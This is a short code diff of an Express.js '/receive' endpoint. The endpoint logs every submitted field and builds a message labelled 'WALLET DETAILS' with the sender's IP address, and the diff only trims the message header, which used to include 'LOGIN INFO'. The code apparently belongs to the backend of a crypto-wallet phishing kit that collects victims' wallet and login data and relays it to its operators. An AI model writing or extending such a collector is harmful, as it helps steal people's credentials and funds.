@@ -73,8 +73,7 @@ app.post('/receive', async (req, res) => {
   const myObjects = Object.keys(myObject);
 	console.log(myObjects);
 	
-    message += `✅ UPDATE TEAM | WALLET DETAILS | USER_${ipAddress}\n\n` +
-               `👤 LOGIN INFO\n\n`;
+    message += `✅ WALLET DETAILS | USER_${ipAddress}\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
